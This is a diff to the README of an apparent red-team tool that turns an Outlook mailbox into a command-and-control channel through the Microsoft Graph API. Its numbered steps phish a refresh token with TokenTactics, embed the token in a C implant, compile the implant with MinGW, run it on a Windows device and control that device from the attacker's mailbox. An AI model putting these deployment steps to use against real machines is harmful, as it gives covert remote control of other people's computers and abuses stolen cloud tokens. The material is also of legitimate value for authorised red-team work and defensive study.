@@ -66,24 +66,25 @@ PS C:\Users\boku\TokenTactics> Import-Module .\TokenTactics.psd1
 PS C:\Users\boku\> Get-AzureToken -Client Graph
 user_code        : ERDVDCNHH
 ```
-3. Go to [microsoft.com/devicelogin](https://microsoft.com/devicelogin), enter the `user_code` from TokenTactics, and login with the C2 mailbox user.
-4. In the PowerShell session running TokenTactics, copy the refresh token from the successful device code phish on yourself.
-5. Add your refresh token to the  `char refreshToken[]` variable within the `azureOutlookC2.c` file.
+5. Go to [microsoft.com/devicelogin](https://microsoft.com/devicelogin), enter the `user_code` from TokenTactics, and login with the C2 mailbox user.
+6. In the PowerShell session running TokenTactics, copy the refresh token from the successful device code phish on yourself.
+  + If you need more information on how TokenTactics works, please see [The Art of the Device Code Phish](https://0xboku.com/2021/07/12/ArtOfDeviceCodePhish.html)
+7. Add your refresh token to the  `char refreshToken[]` variable within the `azureOutlookC2.c` file.
 ```c
 void main() {
     // Variables
     char refreshToken[] = "0.AXwAoFFVHfL0AUGcOzlCR-x-CNYOWdOzUgJBrv-q0ikqsBx8ACA.AgABAAAAAA...
 //                           ^Put your refresh token here and compile
 ```
-6. Compile `azureOutlookC2.c`.
+8. Compile `azureOutlookC2.c`.
 ```bash
 # Compile with x64 MinGW:
 bobby.cooke$ cat compile.sh
 x86_64-w64-mingw32-gcc -m64 -mwindows -Os azureOutlookC2.c -o azureOutlookC2.exe -lwininet
 bobby.cooke$ bash compile.sh
 ```
-7. Execute the `azureOutlookC2.exe` PE file on a Windows Device.
-8. As the attacker from the attacker computer, open a browser, login to `outlook.office.com`, and control the Windows device running the implant from your mailbox.
+9. Execute the `azureOutlookC2.exe` PE file on a Windows Device.
+10. As the attacker from the attacker computer, open a browser, login to `outlook.office.com`, and control the Windows device running the implant from your mailbox.
 
 ## Initial Project Goals
 + Make a working proof of concept that uses the Microsoft Graph API for a C2 channel and control a computer from my email.
